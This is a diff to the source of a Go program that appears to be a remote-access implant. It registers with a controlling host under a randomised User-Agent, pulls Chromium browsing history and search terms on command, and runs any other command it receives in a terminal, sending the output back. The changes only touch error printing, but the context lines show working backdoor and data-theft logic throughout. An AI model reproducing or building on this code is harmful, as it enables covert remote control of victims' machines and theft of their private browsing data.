@@ -73,13 +73,13 @@ func identify(host, id string, publicKey *rsa.PublicKey) bool {
 
 	detailsJson, err := json.Marshal(details)
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 		return false
 	}
 
 	payloadJson, err := serializedTraffic(string(detailsJson))
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 		return false
 	}
 
@@ -88,7 +88,7 @@ func identify(host, id string, publicKey *rsa.PublicKey) bool {
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 		return false
 	}
 	defer request.Body.Close()
@@ -96,7 +96,7 @@ func identify(host, id string, publicKey *rsa.PublicKey) bool {
 	client := &http.Client{}
 	response, err := client.Do(request)
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 		return false
 	}
 	defer response.Body.Close()
@@ -104,7 +104,7 @@ func identify(host, id string, publicKey *rsa.PublicKey) bool {
 	// StatusNoContent - We have been inserted into the database.
 	// StatusConflict - We are already in the database.
 	if response.StatusCode != http.StatusCreated && response.StatusCode != http.StatusConflict {
-		fmt.Println("Identification failed with status code: " + fmt.Sprint(response.StatusCode))
+		fmt.Println("Identification failed with status code: " + fmt.Sprint(response.StatusCode) + ", expected:" + fmt.Sprint(http.StatusCreated) + "," + fmt.Sprint(http.StatusConflict))
 		return false
 	}
 
@@ -231,7 +231,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 	} else if content.Shell == "/browserVisits" {
 		visits, err := grabChromiumHistory("VISITS")
 		if err != nil {
-			fmt.Println(err.Error())
+			fmt.Println(err)
 			return reply, err
 		}
 
@@ -241,7 +241,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 	} else if content.Shell == "/browserSearches" {
 		searches, err := grabChromiumHistory("TERMS")
 		if err != nil {
-			fmt.Println(err.Error())
+			fmt.Println(err)
 			return reply, err
 		}
 
@@ -252,7 +252,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 		term := content.Shell[8:]
 		searchResults, err := duckit(term)
 		if err != nil {
-			fmt.Println(err.Error())
+			fmt.Println(err)
 			return reply, err
 		}
 		replyContent.WebSearchResults = searchResults
@@ -261,7 +261,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 	} else {
 		replyContent.ShellOutput, err = runTerminal(content.Shell)
 		if err != nil {
-			fmt.Println(err.Error())
+			fmt.Println(err)
 			return reply, err
 		}
 	}
@@ -278,7 +278,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 
 	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 		return reply, err
 	}
 
@@ -303,7 +303,7 @@ func fetchMessages(host, id string) ([]Message, error) {
 	client := &http.Client{}
 	response, err := client.Do(request)
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 	}
 	defer response.Body.Close()
 
